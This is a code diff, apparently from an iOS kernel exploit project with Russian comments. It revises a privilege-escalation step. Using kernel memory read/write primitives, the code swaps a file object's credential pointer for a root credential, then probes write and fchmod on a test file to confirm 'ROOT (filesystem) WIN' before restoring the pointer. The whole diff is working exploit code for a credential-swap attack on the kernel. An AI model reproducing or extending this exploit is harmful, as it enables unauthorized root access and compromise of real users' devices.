@@ -2349,9 +2349,17 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         kpNote(r, @"  [ATK] step4: refcount-инфлейт пропущен (ucred_rw не 0x21)");
     }
 
-    // ---- FGATTACK: свап → ОДНА проба → restore ----
-    int tfd = open("/private/etc/hosts", O_RDONLY);
-    kpNote(r, [NSString stringWithFormat:@"  [ATK] step5: hosts fd=%d", tfd]);
+    // ---- FGATTACK 2.0.61: свой файл + mode 000, пробы write/fchmod ----
+    // Не /etc/hosts: системный файл + root f_cred = лишний VFS. Свой файл
+    // в Documents, fchmod(0) — write по идее падает без прав; если f_cred
+    // реально авторизует — write пройдёт как root.
+    NSString *docsPath = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *fgPath = [docsPath stringByAppendingPathComponent:@"fgtest.txt"];
+    [[NSFileManager defaultManager] createFileAtPath:fgPath contents:[@"fg" dataUsingEncoding:NSUTF8StringEncoding] attributes:nil];
+    int tfd = open(fgPath.fileSystemRepresentation, O_RDWR);
+    int modeStrip = -1, eStrip = 0;
+    if (tfd >= 0) { modeStrip = fchmod(tfd, 0); eStrip = errno; }
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step5: own-file fd=%d fchmod0=%d e=%d", tfd, modeStrip, eStrip]);
     uint64_t glob = 0;
     if (tfd >= 0 && selfProc) {
         uint64_t fdOf = 0, fpRaw = 0, globRaw = 0;
@@ -2380,16 +2388,20 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             uint64_t old = early_kread64(glob + fgOff);
             early_kwrite64(glob + fgOff, rootZVA);
             uint64_t rb = early_kread64(glob + fgOff);
-            int ch = fchmod(tfd, 0644);   // одна проба, мгновенно
-            early_kwrite64(glob + fgOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d errno=%d → restored — %@",
-                      (unsigned long long)rb, ch, errno, ch == 0 ? @"ROOT-FS WIN ★★" : @"проба мимо (process-cred авторизация)"]);
-            if (ch == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
+            ssize_t wr = write(tfd, "X", 1);
+            int eWr = errno;
+            int ch = fchmod(tfd, 0644);
+            int eCh = errno;
+            early_kwrite64(glob + fgOff, old);
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → write=%zd/e%d fchmod=%d/e%d → restored — %@",
+                      (unsigned long long)rb, wr, eWr, ch, eCh,
+                      (wr == 1 || ch == 0) ? @"ROOT-FS WIN ★★" : @"пробы мимо (process-cred)"]);
+            if (wr == 1 || ch == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
         } else {
             kpNote(r, @"  [ATK] step8: SKIPPED — type!=0x21, kwrite запрещён (апертура-фолт = ребут)");
         }
     }
-    if (tfd >= 0) close(tfd);
+    if (tfd >= 0) { fchmod(tfd, 0644); close(tfd); }
 
     // ---- SOATTACK: свежий сокет, свап → одна проба → restore ----
     extern uint64_t rwSocketPcb;
